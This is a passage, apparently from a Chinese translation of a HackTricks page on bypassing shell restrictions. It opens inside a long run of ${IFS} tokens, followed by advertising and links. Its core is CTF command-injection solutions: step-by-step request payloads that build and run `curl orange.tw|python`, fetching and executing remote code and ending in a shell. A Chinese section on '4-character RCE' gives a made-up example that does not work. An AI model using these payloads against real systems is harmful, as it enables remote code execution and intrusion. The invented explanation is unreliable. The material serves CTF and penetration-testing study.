IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${IFS}IFS${
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4个字符的远程命令执行（RCE）

在某些情况下，我们可能会遇到一些限制，例如仅允许使用特定字符或特定长度的命令执行。在这种情况下，我们需要找到一种方法来绕过这些限制。下面是一种使用仅4个字符的远程命令执行（RCE）的方法。

#### 方法

1. 首先，我们需要找到一个允许我们执行命令的上下文。这可以是任何允许我们输入命令的地方，例如一个输入框或一个命令行界面。

2. 接下来，我们需要找到一个可以执行我们想要的命令的字符序列。这可以是任何字符序列，只要它能够执行我们想要的命令即可。

3. 然后，我们需要将命令分解为4个字符的片段。我们可以使用各种技术来实现这一点，例如使用特殊字符或利用命令的特定属性。

4. 最后，我们将这些4个字符的片段输入到允许我们执行命令的上下文中。这样，我们就可以通过这些片段来执行我们想要的命令。

#### 示例

假设我们只能使用字符`$`和`|`来执行命令，并且我们想要执行`ls`命令。我们可以将`ls`命令分解为以下4个字符的片段：

```
l$|
s$|
```

然后，我们将这些片段输入到允许我们执行命令的上下文中。这样，我们就可以通过这些片段来执行`ls`命令。

#### 注意事项

- 在使用这种方法时，我们需要确保我们的命令能够在4个字符的限制下正常执行。否则，我们可能需要使用其他技术来绕过限制。

- 在实际应用中，我们需要根据具体情况来选择合适的字符序列和分解方法。这取决于我们所面对的限制和目标系统的特性。

- 在执行远程命令时，我们需要谨慎操作，确保我们有合法的授权和合法的目的。违反法律规定的远程命令执行是非法的。
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## 只读/Noexec/Distroless绕过

如果你在一个具有**只读和noexec保护**甚至是在一个distroless容器中，仍然有办法**执行任意二进制文件，甚至是一个shell！**

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot和其他监狱绕过

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## 参考资料和更多

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流程**，由全球**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
